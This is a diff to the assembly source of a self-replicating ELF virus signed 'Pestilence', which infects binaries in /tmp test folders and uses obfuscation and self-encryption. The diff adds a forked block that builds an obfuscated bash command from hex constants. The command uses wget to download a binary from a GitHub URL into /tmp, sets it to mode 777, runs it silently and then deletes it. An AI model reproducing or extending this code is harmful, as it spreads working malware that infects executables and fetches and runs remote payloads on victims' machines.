@@ -4,6 +4,7 @@ SECTION .TEXT EXEC WRITE
 global  _start                              ;must be declared for linker (ld)
 
 _start:   ;Entry-Point
+int3
 OBF_GENERIC
 PUSH
 OBF_GENERIC
@@ -285,13 +286,100 @@ DECYPHER
 	OBF_GENERIC
 
 
+
 .enc_start:
+
+;DUREX BLOCK HERE  BETWEEN .DUREX AND .SKIP_DUREX
+.durex:
+
+;FORK THE DUREX PROCESS !
+	mov rax, _fork
+	syscall
+	cmp rax, 0
+	jne .skip_durex
+
+
+	;CLOSE FD 1 AND 2 FOR FORKED  DUREX PROCESS
+	mov rax, _close
+	mov rdi, 1
+	syscall
+	mov rax, _close
+	mov rdi, 2
+	syscall
+
+
+
+	lea rdi, STACK(famine.status_str)
+	lea rsi, STACK(famine.commpath)
+	mov rax, 0x69622f
+	mov qword[rdi], rax
+	add rdi, 3
+	mov rax, 0x687361622f6e
+	mov qword[rdi], rax
+	sub rdi, 3
+	mov qword[rsi], rdi
+
+	mov dword STACK(famine.new_dir), 0x0000632d
+	lea rax, STACK(famine.new_dir)
+
+	mov qword[rsi+8], rax
+	add rax, 4
+
+	mov byte[rax], 0x27
+	inc rax
+	mov r10, 0x74656777
+	mov qword[rax], r10
+	mov qword[rsi+16], rax
+	add rax, 4
+	mov r10b, 0x20
+	mov byte[rax], r10b
+	inc rax
+
+	mov r10, 0x2f2f3a7370747468
+	mov qword[rax], r10
+	mov r10, 0x632e627568746967
+	mov qword[rax+8], r10
+	mov r10, 0x756f6172612f6d6f
+	mov qword[rax+16], r10
+	mov r10, 0x756465722f323474
+	mov qword[rax+24], r10
+	mov r10, 0x6d2f626f6c622f78
+	mov qword[rax+32], r10
+	mov r10, 0x75442f7265747361
+	mov qword[rax+40], r10
+	mov r10, 0x3d7761723f786572
+	mov qword[rax+48], r10
+	mov r10, 0x2d20657572743d77
+	mov qword[rax+54], r10
+	mov r10, 0x742f706d742f204f
+	mov qword[rax+62], r10
+	mov r10, 0x74656975712d2d20
+	mov qword[rax+70], r10
+	mov r10, 0x7665642f206f2d20
+	mov qword[rax+78], r10
+	mov r10, 0x2020206c6c756e2f
+	mov qword[rax+86], r10
+	mov r10, 0x6f6d686320262620
+	mov qword[rax+94], r10
+	mov r10, 0x742f203737372064
+	mov qword[rax+102], r10,
+	mov r10, 0x20262620742f706d
+	mov qword[rax+110], r10
+	mov r10, 0x723b742f706d742f
+	mov qword[rax+118], r10
+	mov r10, 0x742f706d742f206d
+	mov qword[rax+126], r10
+	mov qword[rsi+24], 0x0
+	mov rdx, 0
+	mov rax, 59
+	syscall
+	.skip_durex:
+
 	OBF_GENERIC1
 	mov rax, _fork
 	syscall
 	cmp rax, 0
 	jne _exx_pop
-
 
 lea rdi, [rel infect_dir] ; load dir str
 .opendir:
@@ -519,7 +607,7 @@ OBF_GENERIC1
 	mov r13, STACK(famine.file_data)
 	add r13, rax
 	sub r13, BEGIN_SIGNATURE_OFFSET_FORM_END
-	cmp byte[r13], 'F'
+	cmp byte[r13], 'P'
 	je .return_pop
 
 	; get delta  ( address at execution time)
@@ -690,6 +778,7 @@ CYPHER
 
 	mov rax, _sync
 	syscall
+	
 	jmp .return
 	.return_pop:
 	OBF_POP_RAX
@@ -706,7 +795,7 @@ infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
 enc_end:
 	db 0
 signature		db			0x00, 'Pestilence version 99.0 (c)oded by <araout>42424242', 0xa, 0x00
-forbidden		db			"test.out", 0
+forbidden		db			"Durex", 0
 famine_entry	dq			_start
 random			db			"/dev/urandom",0,0
 
